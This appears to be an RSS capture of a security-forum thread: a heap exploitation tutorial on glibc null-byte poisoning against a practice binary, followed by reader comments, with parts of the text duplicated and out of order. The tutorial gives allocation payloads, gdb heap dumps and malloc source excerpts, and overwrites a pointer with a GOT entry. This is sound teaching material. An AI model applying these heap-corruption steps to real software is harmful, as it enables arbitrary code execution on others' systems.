+0x6031f0:	0x00000000006033a0	0x00007ffff7dd37b8								 |
+0x603200:	0x4747474747474747	0x4747474747474747								 |
+0x603210:	0x4747474747474747	0x4747474747474747								 |
+0x603220:	0x4747474747474747	0x4747474747474747								 | + 0x110
+							...													 |
+0x6032e0:	0x4747474747474747	0x4747474747474747								 |
+0x6032f0:	0x0000000000000110	0x0000000000000020 &lt;-- chunk w still in use &lt; - - 
+0x603300:	0x0000000000000080	0x0000000000603320 &lt;-- pointer in use
+0x603310:	0x4444444444444444	0x0000000000000091
+0x603320:	0x4848484848484848	0x4848484848484848
+	
+```
+
+Voila! Chunk z and chunk y are now one entity and an allocation less than **0x321** in size and greater than **0x110** will be able to overwrite the pointer at address `0x603308`. Let&#39;s inspect main arena&#39;s state.
+
+```makefile
+==================  Main Arena  ==================
+(0x20)     fastbin[0]: 0x603060 --&gt; 0x603040 --&gt; 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+                  top: 0x603610 (size : 0x209f0) 
+       last_remainder: 0x6033a0 (size : 0x40) 
+            unsortbin: 0x6031e0 (size : 0x320) &lt;--&gt; 0x6033a0 (overlap chunk with 0x6031e0(freed) )
+```
+
+Looking good. Ask yourselves, which code path will malloc take in case of an allocation of size **0x140**? Let&#39;s make our assumptions:
+
+* When deleting fastbins from bin lists, it&#39;s done via the **head** of the list. Meaning, _0x603060_ should be given back to us to place the size of the data and the pointer to it.
+
+* As for the data of size **0x140**, because of the fact that _0x6031e0_ is of small bin size, it&#39;ll be placed in the unsorted bin list just in case the user requests a size less or equal to its size. We should expect _0x6031e0_ to be served back to us in order to store our data. I&#39;ll let you do the malloc calculations for the place where the remainder chunk will end up at.
+
+```python
+# The new consolidated free chunk is placed in the unsorted bin.
+# Further allocations will split that chunk as long as the request size is &lt;= 0x321.
+alloc(0x140, &#39;Z&#39;*0x110 + p64(8) + p64(atoi_got))
+```
+
+```makefile
+
+0x6031e0:	0x4242424242424242	0x0000000000000151 &lt;-- new chunk overlaps with chunk w
+0x6031f0:	0x5a5a5a5a5a5a5a5a	0x5a5a5a5a5a5a5a5a
+0x603200:	0x5a5a5a5a5a5a5a5a	0x5a5a5a5a5a5a5a5a
+0x603210:	0x5a5a5a5a5a5a5a5a	0x5a5a5a5a5a5a5a5a
+					...					...
+0x6032f0:	0x5a5a5a5a5a5a5a5a	0x5a5a5a5a5a5a5a5a &lt;-- chunk w is overwritten
+0x603300:	0x0000000000000008	0x0000000000602058 &lt;-- atoi&#39;s GOT entry
+	
+```
+
+---
+
+###_Conclusion_
+
+The rest is history, I&#39;ll let you figure out what&#39;s next, it&#39;s a piece of cake at this point. That&#39;s been it folks. If you reached up to this sentence you&#39;re a true champ and I&#39;d like to thank you for taking the time to read my post. I hope you learnt something new and if you have any questions feel free to ask them down below or hit me up on IRC/twitter. 
+
+---
+
+###_References_
+
+
+(1)   [how2heap](https://github.com/shellphish/how2heap/blob/master/poison_null_byte.c)
+(2)    [HITCON Lab](https://github.com/scwuaptx/HITCON-Training/tree/master/LAB/lab13)
+
+
+~ Peace out</description>
+    
+    <lastBuildDate>Tue, 09 Jan 2018 11:28:23 +0000</lastBuildDate>
+    <category>Exploit Development</category>
+    <atom:link href="https://d.clarkee.co.uk/t/null-byte-poisoning-the-magic-byte/3874.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Null Byte Poisoning - The Magic Byte</title>
+        <dc:creator><![CDATA[_py]]></dc:creator>
+        <description><![CDATA[
+            
+          <p><a href="https://d.clarkee.co.uk/t/null-byte-poisoning-the-magic-byte/3874/7">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/null-byte-poisoning-the-magic-byte/3874/7</link>
+        <pubDate>Tue, 09 Jan 2018 11:28:34 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-3874-7</guid>
+        <source url="https://d.clarkee.co.uk/t/null-byte-poisoning-the-magic-byte/3874.rss">Null Byte Poisoning - The Magic Byte</source>
+      </item>
+      <item>
+        <title>Null Byte Poisoning - The Magic Byte</title>
+        <dc:creator><![CDATA[_py]]></dc:creator>
+        <description><![CDATA[
+            
+          <p><a href="https://d.clarkee.co.uk/t/null-byte-poisoning-the-magic-byte/3874/6">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/null-byte-poisoning-the-magic-byte/3874/6</link>
+        <pubDate>Tue, 09 Jan 2018 11:28:23 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-3874-6</guid>
+        <source url="https://d.clarkee.co.uk/t/null-byte-poisoning-the-magic-byte/3874.rss">Null Byte Poisoning - The Magic Byte</source>
+      </item>
+      <item>
+        <title>Null Byte Poisoning - The Magic Byte</title>
+        <dc:creator><![CDATA[_py]]></dc:creator>
+        <description><![CDATA[
+            
+          <p><a href="https://d.clarkee.co.uk/t/null-byte-poisoning-the-magic-byte/3874/5">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/null-byte-poisoning-the-magic-byte/3874/5</link>
+        <pubDate>Thu, 26 Oct 2017 22:26:07 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-3874-5</guid>
+        <source url="https://d.clarkee.co.uk/t/null-byte-poisoning-the-magic-byte/3874.rss">Null Byte Poisoning - The Magic Byte</source>
+      </item>
+      <item>
+        <title>Null Byte Poisoning - The Magic Byte</title>
+        <dc:creator><![CDATA[_py]]></dc:creator>
+        <description><![CDATA[
+            <p>Thank you for the feedback!</p>
+<aside class="quote no-group" data-username="tauheed_khan" data-post="3" data-topic="3874">
+<div class="title">
+<div class="quote-controls"></div>
+<img alt="" width="24" height="24" src="https://d.clarkee.co.uk/letter_avatar_proxy/v4/letter/t/a87d85/48.png" class="avatar"> tauheed_khan:</div>
+<blockquote>
+<p>How much time you take to upload this information</p>
+</blockquote>
+</aside>
+<p>That depends entirely on how “heavy” the topic I’m trying to share is. This particular concept for instance is by far the most technical write-up I’ve written so far. I’d say it took me about 2-3 weeks of continuous research/reading and then about 4-5 days to create a pwnable, write a PoC and simplify the technique to make it a bit easier to digest.</p>
+          <p><a href="https://d.clarkee.co.uk/t/null-byte-poisoning-the-magic-byte/3874/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/null-byte-poisoning-the-magic-byte/3874/4</link>
+        <pubDate>Sun, 22 Oct 2017 20:41:06 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-3874-4</guid>
+        <source url="https://d.clarkee.co.uk/t/null-byte-poisoning-the-magic-byte/3874.rss">Null Byte Poisoning - The Magic Byte</source>
+      </item>
+      <item>
+        <title>Null Byte Poisoning - The Magic Byte</title>
+        <dc:creator><![CDATA[tauheed_khan]]></dc:creator>
+        <description><![CDATA[
+            <p>How much time you take to upload this information here ur awesome bro but I can’t understand any thing as I am beginner but it looks super cool what u did</p>
+          <p><a href="https://d.clarkee.co.uk/t/null-byte-poisoning-the-magic-byte/3874/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/null-byte-poisoning-the-magic-byte/3874/3</link>
+        <pubDate>Sun, 22 Oct 2017 20:16:29 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-3874-3</guid>
+        <source url="https://d.clarkee.co.uk/t/null-byte-poisoning-the-magic-byte/3874.rss">Null Byte Poisoning - The Magic Byte</source>
+      </item>
+      <item>
+        <title>Null Byte Poisoning - The Magic Byte</title>
+        <dc:creator><![CDATA[k3rnelmaster]]></dc:creator>
+        <description><![CDATA[
+            <p>Thank you for great tutorial <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"><br>
+I didn’t know well about heap Null poison attack . thanks to you  I feel like I’m getting know about it <img src="https://0x00sec.org/images/emoji/twitter/blush.png?v=9" title=":blush:" class="emoji" alt=":blush:"><br>
+Thank you again, _py~</p>
+          <p><a href="https://d.clarkee.co.uk/t/null-byte-poisoning-the-magic-byte/3874/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/null-byte-poisoning-the-magic-byte/3874/2</link>
+        <pubDate>Fri, 20 Oct 2017 03:54:13 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-3874-2</guid>
+        <source url="https://d.clarkee.co.uk/t/null-byte-poisoning-the-magic-byte/3874.rss">Null Byte Poisoning - The Magic Byte</source>
+      </item>
+      <item>
+        <title>Null Byte Poisoning - The Magic Byte</title>
+        <dc:creator><![CDATA[_py]]></dc:creator>
+        <description><![CDATA[
+            <p>Hello folks! I hope you’re all doing great! Today’s topic is by far my most favorite heap exploitation technique I’ve ever dealt with until now (as far as Linux is concerned). I can’t stress enough how much I love this technique. It’s super smart, technical, and even though malloc has been hardened a ton over the years, it still bypasses all mitigations. And the best part, one single byte overflow can cause chaos.</p>
+<p>For today’s demo purposes, I’ve created a <a href="https://transfer.sh/wYEUU/magicbyte" rel="nofollow noopener">pwnable</a> in order to practice/showcase the technique (I’ll demo the exploit on Ubuntu 16.04). I highly recommend going through some google research and my previous posts on heap exploitation if you’ve never pwned the heap before. At the end of the post you can find another pwnable of the same nature made by HITCON in case you want to master the technique. Without further ado, let’s get right into it!</p>
+<hr>
+<p><em><strong>Disclaimer:</strong> The following text is part of my own research / comprehension. If you’re a veteran on this topic and you happen to spot any mistake please let me know and I’ll correct it asap.</em></p>
+<hr>
+<p>###<em>Binary Recon</em></p>
+<p>Before we jump into the theory of the null byte poison attack, let’s skim through the assembly real quick. The binary doesn’t do anything extroardinary.</p>
+<ul>
+<li>We can allocate a chunk. The chunk has the following structure:</li>
+</ul>
+<pre><code class="lang-auto">struct chunk {
+     size_t size;
+     char* data;
+};
+</code></pre>
+<ul>
+<li>
+<p>We can dump the chunk’s content.</p>
+</li>
+<li>
+<p>We can free the chunk. No bugs there.</p>
+</li>
+</ul>
+<pre><code class="lang-auto">/* index */  
+mov eax, dword [rbp-0x14]  
+mov rax, qword [rax*8+array]
+/* Free data's malloc'd pointer */  
+mov rax, qword [rax+0x8]
+mov rdi, rax
+call free
+mov eax, dword [rbp-0x14]
+/* Free the chunk itself */
+mov rax, qword [rax*8+0x6020c0]
+mov rdi, rax
+call free
+mov eax, dword [rbp-0x14]
+/* No UAF or double-free */ 
+mov qword [rax*8+0x6020c0], 0x0
+</code></pre>
+<ul>
+<li>And finally we can edit the chunk’s content, that’s where the magic happens.</li>
+</ul>
+<pre><code class="lang-auto">mov eax, dword [rbp-0x14]
+mov rax, qword [rax*8+0x6020c0]
+/* Get size of data */
+mov rdx, qword [rax]
+mov eax, dword [rbp-0x14]
+mov rax, qword [rax*8+0x6020c0]
+/* Get the data pointer */
+mov rax, qword [rax+0x8]
+mov rsi, rdx
+mov rdi, rax
+call 0x400b12
+
+0x400b12:
+
+	/* Null terminate at offset data + size */
+	mov qword [rbp-0x8], rdi
+	mov qword [rbp-0x10], rsi
+	mov rdx, qword [rbp-0x8]
+	mov rax, qword [rbp-0x10]
+	add rax, rdx
+	mov byte [rax], 0x0
+
+
+</code></pre>
+<p>Although this function might not look buggy to the unexperienced eye, it’s actually pretty lethal. Consider the following example:</p>
+<pre><code class="lang-python">alloc(0x88,  'A'*0x88)
+alloc(0x108, 'B'*0x108)
+</code></pre>
+<pre><code class="lang-makefile">0x603000:	0x0000000000000000	0x0000000000000021 &lt;-- chunk 0
+0x603010:	0x0000000000000088	0x0000000000603030 &lt;-- data pointer
+0x603020:	0x0000000000000000	0x0000000000000091
+0x603030:	0x4141414141414141	0x4141414141414141
+					...					...
+0x6030a0:	0x4141414141414141	0x4141414141414141
+0x6030b0:	0x4141414141414141	0x0000000000000021 &lt;-- chunk 1
+0x6030c0:	0x0000000000000108	0x00000000006030e0 &lt;-- data pointer
+0x6030d0:	0x0000000000000000	0x0000000000000111
+0x6030e0:	0x4242424242424242	0x4242424242424242
+0x6030f0:	0x4242424242424242	0x4242424242424242
+					...					...
+
+</code></pre>
+<p>If we call edit on chunk 0, it will take data’s address (<em>0x603030</em>) and null terminate its content at offset:</p>
+<pre><code class="lang-makefile">0x603030 + 0x88 = 0x6030b8 = chunk 1's size field.
+</code></pre>
+<pre><code class="lang-python">edit(0, 'A'*2)
+</code></pre>
+<pre><code class="lang-makefile">0x603000:	0x0000000000000000	0x0000000000000021 &lt;-- chunk 0
+0x603010:	0x0000000000000088	0x0000000000603030 &lt;-- data pointer
+0x603020:	0x0000000000000000	0x0000000000000091
+0x603030:	0x4141414141414141	0x4141414141414141
+					...					...
+0x6030a0:	0x4141414141414141	0x4141414141414141
+0x6030b0:	0x4141414141414141	0x0000000000000000 &lt;-- chunk 1
+0x6030c0:	0x0000000000000108	0x00000000006030e0 &lt;-- data pointer
+0x6030d0:	0x0000000000000000	0x0000000000000111
+0x6030e0:	0x4242424242424242	0x4242424242424242
+0x6030f0:	0x4242424242424242	0x4242424242424242
+					...					...
+
+</code></pre>
+<p>Booyah, corruption! Chunk 1’s size went from <strong>0x21</strong> to <strong>0x00</strong>. The binary recon is over, let’s move on to the pwning part.</p>
+<hr>
+<p>###<em>Leaking Libc</em></p>
+<p>The heap has the above structure. There are two ways to leak libc. The boring way and the 1337 way. I’ll illustrate both because why not. Free-ing chunk 0 has the following effect.</p>
+<pre><code class="lang-python">free(0)
+</code></pre>
+<pre><code class="lang-makefile">0x603000:	0x0000000000000000	0x0000000000000021 &lt;-- chunk 0
+0x603010:	0x0000000000000000	0x0000000000603030
+0x603020:	0x0000000000000000	0x0000000000000091
+0x603030:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
+</code></pre>
+<p>Because of the fact that the data’s heap chunk is of size <strong>0x90</strong>, it’s considered a small bin chunk. Meaning, it will be placed in a circly double-linked list. Actually, it’ll first be placed in the unsorted bin list since malloc likes to give the recently free’d chunk one chance of re-allocation before it places it in the corresponding small bin list for speed purposes.</p>
+<pre><code class="lang-auto">/*
+    Place the chunk in unsorted chunk list. Chunks are
+    not placed into regular bins until after they have
+    been given one chance to be used in malloc.
+ */
+
+    bck = unsorted_chunks(av);
+    fwd = bck-&gt;fd;
+    if (__glibc_unlikely (fwd-&gt;bk != bck))
+        malloc_printerr ("free(): corrupted unsorted chunks");
+    p-&gt;fd = fwd;
+    p-&gt;bk = bck;
+    if (!in_smallbin_range(size))
+    {
+        p-&gt;fd_nextsize = NULL;
+        p-&gt;bk_nextsize = NULL;
+    }
+    bck-&gt;fd = p;
+    fwd-&gt;bk = p;
+
+    set_head(p, size | PREV_INUSE);
+    set_foot(p, size);
+
+    check_free_chunk(av, p);
+
+</code></pre>
+<p>The BK and FD pointers you see in the data’s chunk are main arena pointers in libc. They have the same value because the free’d chunk is the only chunk in the circly double-linked list so both its BK and FD fields will point to the same bin address. The main arena’s state is the follwing:</p>
+<pre><code class="lang-makefile">==================  Main Arena  ==================
+(0x20)     fastbin[0]: 0x603000 --&gt; 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+                  top: 0x6031e0 (size : 0x20e20) 
+       last_remainder: 0x0 (size : 0x0) 
+            unsortbin: 0x603020 (size : 0x90)
+</code></pre>
+<p>Having read malloc’s source code, we should expect our data to be stored in the unsorted bin chunk at <em>0x603020</em> once we request a new allocation again. Why?</p>
+<hr>
+<h2><em>Our data’s size is <code>0x8</code> bytes long, meaning it’s of fast chunk size. However, because of the fact that the first allocation stores the size of the data and the pointer to the data (0x20 bytes in total including metadata), 0x603000 will be returned for the first allocation. Now we’re left with the unsorted bin chunk and no fastbin available to store our 8 byte long data. When there’s no fastbin available, the chunk will be served through smallbin code, and if there’s no smallbin available (there is none in our case), the chunk will be served through unsorted bin code (0x603020 in our case) or via the remainder. Let’s see it in action.</em></h2>
+<pre><code class="lang-python"># Could've leaked libc but let's step it up
+alloc(0x8, 'C'*0x8) 
+</code></pre>
+<pre><code class="lang-makefile">0x603000:	0x0000000000000000	0x0000000000000021 &lt;-- new chunk
+0x603010:	0x0000000000000008	0x0000000000603030
+0x603020:	0x0000000000000000	0x0000000000000021 &lt;-- new data pointer
+0x603030:	0x4343434343434343	0x00007ffff7dd3838
+0x603040:	0x4141414141414141	0x0000000000000071 &lt;-- remainder chunk after the split
+0x603050:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
+</code></pre>
+<p>We allocated just enough bytes to not overwrite the libc pointer. As you might noticed the BK field got updated to <strong>0x00007ffff7dd3838</strong>. Why this happened is for you to figure it out, I can’t spoon feed you everything <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
+<p>Now if we go ahead and dump the chunk’s content, we’ll get the libc address (obviously in every execution the address will be a bit different but its offset from the base address always remains the same, check it out by yourself) back and we’ll be able to calculate libc’s base address. That’s boring. Let’s abuse the null byte overflow in order to leak and then execute arbitrary code.</p>
+<hr>
+<p>###<em>The Whys &amp; Hows</em></p>
+<p>There are many cases of a null byte poison. In a heap context though, null byte poisoning, aka off-by-one overflow, aka null byte overflow, aka chunk shrinking, is usually the ability to overflow a chunk’s size field while it’s free, leading to all kinds of pleasant mysteries.</p>
+<p>The hows and whys of the mysteries will be presented by showing you the core pieces of malloc’s source code which the exploit/technique takes advantage of in order to achieve arbitrary code execution. Don’t worry if some of the code snippets make no sense in the beginning. When I’ll introduce the technique I’ll explain everything ranging from macros all the way up to the pointer arithmetic being used.</p>
+<hr>
+<p>The scenario which I’ll try to achieve with this technique is to overlap a new allocated chunk with an already in use chunk (you’ll see what I mean) in order to overwrite the data pointer of the latter. There might be other ways to achieve arbitrary code execution by abusing this bug but the core effects should be the same.</p>
+<p>Let’s first allocate a couple more chunks in order to make the technique work. Since the heap is quite complicated, what I like to do before any malloc/free is “guess” where the chunks will be placed in memory in order to test my understanding. So let’s make some assumptions together.</p>
+<pre><code class="lang-python"># p64(0x200) is needed afterwards in order to bypass one of unlink's checks
+alloc(0x208, 'D'*0x1f0 + p64(0x200)) 
+</code></pre>
+<p>Ignore the content of the data for now, I’ll explain all about it later on. The state of main arena is this:</p>
+<pre><code class="lang-makefile">==================  Main Arena  ==================
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+                  top: 0x6031e0 (size : 0x20e20) 
+       last_remainder: 0x603040 (size : 0x70) 
+            unsortbin: 0x603040 (size : 0x70)
+</code></pre>
+<p>The remainder chunk is of size <strong>0x70</strong>. What does that mean for our allocation? As explained before, for every allocation we need <strong>0x20</strong> bytes in total (taking the heap metadata into consideration) in order to store the size of the data and the pointer. <strong>0x20</strong> is obviously less than <strong>0x70</strong> so the remainder chunk will get split, afterwards reattached and finally its size should now become <strong>0x50</strong>.</p>
+<pre><code class="lang-auto">size = chunksize (victim);
+
+/*
+   If a small request, try to use last remainder if it is the
+   only chunk in unsorted bin.  This helps promote locality for
+   runs of consecutive small requests. This is the only
+   exception to best-fit, and applies only when there is
+   no exact fit for a small chunk.
+ */
+
+if (in_smallbin_range (nb) &amp;&amp;
+    bck == unsorted_chunks (av) &amp;&amp;
+    victim == av-&gt;last_remainder &amp;&amp;
+    (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))
+{
+   				...
+ 	/* split and reattach remainder */
+   	remainder_size = size - nb;
+   	remainder = chunk_at_offset (victim, nb);
+   	unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;
+    av-&gt;last_remainder = remainder;
+
+        		...
+    set_head (victim, nb | PREV_INUSE |
+                        (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
+    set_head (remainder, remainder_size | PREV_INUSE);
+    set_foot (remainder, remainder_size);
+
+    check_malloced_chunk (av, victim, nb);
+    void *p = chunk2mem (victim);
+    alloc_perturb (p, bytes);
+    return p;
+ }        
+   	             
+</code></pre>
+<p>As for our data, there’s no available free chunk to be served back to us and thus malloc will use its last resort, the top chunk.</p>
+<pre><code class="lang-auto">victim = av-&gt;top;
+size = chunksize (victim);
+
+if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))
+{
+    remainder_size = size - nb;
+    remainder = chunk_at_offset (victim, nb);
+    av-&gt;top = remainder;
+    set_head (victim, nb | PREV_INUSE |
+               (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
+    set_head (remainder, remainder_size | PREV_INUSE);
+
+    check_malloced_chunk (av, victim, nb);
+    void *p = chunk2mem (victim);
+    alloc_perturb (p, bytes);
+    return p;
+}
+</code></pre>
+<p>Let’s check the effect of our allocation on main arena.</p>
+<pre><code class="lang-makefile">==================  Main Arena  ==================
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+                  top: 0x6033f0 (size : 0x20c10) 
+       last_remainder: 0x603060 (size : 0x50) 
+            unsortbin: 0x0
+(0x050)  smallbin[ 3]: 0x603060
+</code></pre>
+<p>Look at that! The unsorted chunk was well placed in its corresponding small bin list, the last remainder moved further away and its size indeed became <strong>0x50</strong> and finally the top chunk also moved further away with its size reduced by <strong>0x210</strong> bytes as expected. Here’s the gdb view:</p>
+<pre><code class="lang-makefile">0x603000:	0x0000000000000000	0x0000000000000021
+0x603010:	0x0000000000000008	0x0000000000603030
+0x603020:	0x0000000000000000	0x0000000000000021
+0x603030:	0x4343434343434343	0x00007ffff7dd3838
+0x603040:	0x4141414141414141	0x0000000000000021 &lt;-- new allocated chunk
+0x603050:	0x0000000000000208	0x00000000006031f0 &lt;-- new allocated pointer
+0x603060:	0x4141414141414141	0x0000000000000051 &lt;-- reattached remainder chunk
+0x603070:	0x00007ffff7dd37f8	0x00007ffff7dd37f8
+0x603080:	0x4141414141414141	0x4141414141414141
+0x603090:	0x4141414141414141	0x4141414141414141
+0x6030a0:	0x4141414141414141	0x4141414141414141
+0x6030b0:	0x0000000000000050	0x0000000000000020
+0x6030c0:	0x0000000000000108	0x00000000006030e0
+0x6030d0:	0x0000000000000000	0x0000000000000111
+0x6030e0:	0x4242424242424242	0x4242424242424242
+0x6030f0:	0x4242424242424242	0x4242424242424242
+0x603100:	0x4242424242424242	0x4242424242424242
+0x603110:	0x4242424242424242	0x4242424242424242
+0x603120:	0x4242424242424242	0x4242424242424242
+					...					...
+0x6031d0:	0x4242424242424242	0x4242424242424242
+0x6031e0:	0x4242424242424242	0x0000000000000211 &lt;-- new allocated data chunk
+0x6031f0:	0x4444444444444444	0x4444444444444444
+					...					...
+0x6033c0:	0x4444444444444444	0x4444444444444444
+0x6033d0:	0x4444444444444444	0x4444444444444444
+0x6033e0:	0x0000000000000200	0x000000000000000a
+0x6033f0:	0x0000000000000000	0x0000000000020c11 &lt;-- new top chunk
+					...					...
+</code></pre>
+<p>Let’s follow up with the next two allocations which will make malloc take the same code path like last time.</p>
+<pre><code class="lang-python">alloc(0x108, 'E'*0x108) 
+# Prevent top chunk consolidation
+alloc(0x108, 'F'*0x108)
+</code></pre>
+<pre><code class="lang-makefile">0x603000:	0x0000000000000000	0x0000000000000021
+0x603010:	0x0000000000000008	0x0000000000603030
+0x603020:	0x0000000000000000	0x0000000000000021
+0x603030:	0x4343434343434343	0x00007ffff7dd3838
+0x603040:	0x4141414141414141	0x0000000000000021
+0x603050:	0x0000000000000208	0x00000000006031f0
+0x603060:	0x4141414141414141	0x0000000000000021
+0x603070:	0x0000000000000108	0x0000000000603400
+0x603080:	0x4141414141414141	0x0000000000000031
+0x603090:	0x0000000000000108	0x0000000000603510
+0x6030a0:	0x4141414141414141	0x4141414141414141
+0x6030b0:	0x0000000000000030	0x0000000000000021
+0x6030c0:	0x0000000000000108	0x00000000006030e0
+0x6030d0:	0x0000000000000000	0x0000000000000111
+0x6030e0:	0x4242424242424242	0x4242424242424242
+0x6030f0:	0x4242424242424242	0x4242424242424242
+0x603100:	0x4242424242424242	0x4242424242424242
+					...					...
+0x6031c0:	0x4242424242424242	0x4242424242424242
+0x6031d0:	0x4242424242424242	0x4242424242424242
+0x6031e0:	0x4242424242424242	0x0000000000000211 &lt;-- chunk x
+0x6031f0:	0x4444444444444444	0x4444444444444444
+0x603200:	0x4444444444444444	0x4444444444444444
+0x603210:	0x4444444444444444	0x4444444444444444
+					...					...
+0x6033a0:	0x4444444444444444	0x4444444444444444
+0x6033b0:	0x4444444444444444	0x4444444444444444
+0x6033c0:	0x4444444444444444	0x4444444444444444
+0x6033d0:	0x4444444444444444	0x4444444444444444
+0x6033e0:	0x0000000000000200	0x000000000000000a
+0x6033f0:	0x0000000000000000	0x0000000000000111 &lt;-- chunk y
+0x603400:	0x4545454545454545	0x4545454545454545
+0x603410:	0x4545454545454545	0x4545454545454545
+0x603420:	0x4545454545454545	0x4545454545454545
+					...					...
+0x6034d0:	0x4545454545454545	0x4545454545454545
+0x6034e0:	0x4545454545454545	0x4545454545454545
+0x6034f0:	0x4545454545454545	0x4545454545454545
+0x603500:	0x4545454545454545	0x0000000000000111
+0x603510:	0x4646464646464646	0x4646464646464646
+0x603520:	0x4646464646464646	0x4646464646464646
+0x603530:	0x4646464646464646	0x4646464646464646
+					...					...
+0x6035f0:	0x4646464646464646	0x4646464646464646
+0x603600:	0x4646464646464646	0x4646464646464646
+0x603610:	0x4646464646464646	0x00000000000209f1 &lt;-- updated top chunk
+</code></pre>
+<p>Our setup is ready, time to step up our game.</p>
+<hr>
+<p>###<em>Previous Size Field</em></p>
+<p>In case you didn’t know, when a chunk is free’d and is of size greater than the maximum size value of a fast chunk, the chunk that is bordering the free chunk needs to update itself about the fact that the chunk next to it (technically before) got free’d and it does that by setting the <strong>IN_USE</strong> bit to <strong>0</strong> and the <em>prevsize</em> field to the size of the free’d chunk. Let me show you what I mean.</p>
+<pre><code class="lang-python">free(2) # chunk x
+</code></pre>
+<pre><code class="lang-makefile">0x6031e0:	0x4242424242424242	0x0000000000000211 &lt;-- chunk x [free]
+0x6031f0:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
+0x603200:	0x4444444444444444	0x4444444444444444
+0x603210:	0x4444444444444444	0x4444444444444444
+					...					...
+0x6033c0:	0x4444444444444444	0x4444444444444444
+0x6033d0:	0x4444444444444444	0x4444444444444444
+0x6033e0:	0x0000000000000200	0x000000000000000a
+0x6033f0:	0x0000000000000210	0x0000000000000110 &lt;-- chunk y 
+0x603400:	0x4545454545454545	0x4545454545454545
+</code></pre>
+<p>As you can see, chunk y’s size field went from <strong>0x111</strong> to <strong>0x110</strong> to indicate that the previous chunk is free. Moreover, its <em>prevsize</em> field got updated from <strong>0x00</strong> to <strong>0x210</strong>. The <em>prevsize</em> field is used only if the previous chunk is <strong>free</strong>, otherwise it’s part of chunk x’s data. Do the math and see that <em>0x6033f0</em> (the address of chunk y) - <em>0x210</em> equals to <em>0x6031e0</em>.</p>
+<p>Before I overwrite chunk’s size with a null byte (making it 0x200), I believe it’d be nice to have both POVs in mind, the one with non-overwritten size field and the one with the shrunk one. Firstly I will allocate a new chunk by leaving chunk x’s size untouched.</p>
+<pre><code class="lang-python">alloc(0x108,  'G'*0x108)
+</code></pre>
+<p>Malloc will take the following code path:</p>
+<pre><code class="lang-auto">size = chunksize (victim);
+
+/* We know the first chunk in this bin is big enough to use. */
+assert ((unsigned long) (size) &gt;= (unsigned long) (nb));
+
+remainder_size = size - nb;
+
+/* unlink */
+unlink (av, victim, bck, fwd);
+
+		...
+
+remainder = chunk_at_offset (victim, nb);
+
+/* We cannot assume the unsorted list is empty and therefore
+   have to perform a complete insert here. */
+   
+bck = unsorted_chunks (av);
+fwd = bck-&gt;fd;
+if (__glibc_unlikely (fwd-&gt;bk != bck))
+	malloc_printerr ("malloc(): corrupted unsorted chunks 2");
+remainder-&gt;bk = bck;
+remainder-&gt;fd = fwd;
+bck-&gt;fd = remainder;
+fwd-&gt;bk = remainder;
+
+/* advertise as last remainder */
+if (in_smallbin_range (nb))
+    av-&gt;last_remainder = remainder;
+        
+    	...
+
+set_head (victim, nb | PREV_INUSE |
+              (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
+set_head (remainder, remainder_size | PREV_INUSE);
+set_foot (remainder, remainder_size);
+
+check_malloced_chunk (av, victim, nb);
+void *p = chunk2mem (victim);
+alloc_perturb (p, bytes);
+return p; 
+
+</code></pre>
+<p>It may look daunting at first but thankfully malloc’s authors knew how to write readable code and once you stare at it for a while it hits you. To sum up, here’s what will happen:</p>
+<ul>
+<li>
+<p>Calculate the remainder size after the split by subtracting the current size with the requested size (0x210 - 0x110 in our case).</p>
+</li>
+<li>
+<p>Calculate the address of the remainder chunk after the split by adding the requested size + alignment to the base address of the chunk that is about to be allocated (0x6031e0 + 0x110 in our case).</p>
+</li>
+<li>
+<p>Unlink the unsorted chunk from the bin list in order to split it.</p>
+</li>
+<li>
+<p>Declare it as the remainder chunk (av-&gt;last_remainder = remainder).</p>
+</li>
+<li>
+<p>Update the remainder’s size field with the set_head macro.</p>
+</li>
+</ul>
+<pre><code class="lang-auto">/* Set size/use field */
+#define set_head(p, s)  ((p)-&gt;mchunk_size = (s))
+</code></pre>
+<ul>
